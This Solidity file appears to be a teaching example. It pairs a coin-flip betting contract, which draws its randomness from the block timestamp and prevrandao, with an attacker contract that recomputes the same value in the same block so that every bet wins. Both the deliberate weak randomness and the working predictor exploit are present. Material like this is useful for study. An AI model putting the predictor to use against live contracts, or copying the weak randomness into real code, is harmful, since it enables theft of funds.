// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract VulnerableCoinFlipGame {
    function flip(bool guessEven) external payable {
        require(msg.value == 1 ether, "bet must be 1 ether");

        uint256 randomValue = uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao))) % 2;
        bool actualEven = randomValue == 0;

        if (actualEven == guessEven) {
            (bool success,) = payable(msg.sender).call{value: 2 ether}("");
            require(success, "payout failed");
        }
    }
}

contract RandomnessPredictorAttacker {
    VulnerableCoinFlipGame public immutable TARGET;

    constructor(address targetAddress) {
        TARGET = VulnerableCoinFlipGame(targetAddress);
    }

    function attack() external payable {
        uint256 randomValue = uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao))) % 2;
        bool guessEven = randomValue == 0;

        TARGET.flip{value: msg.value}(guessEven);
    }

    receive() external payable {}
}
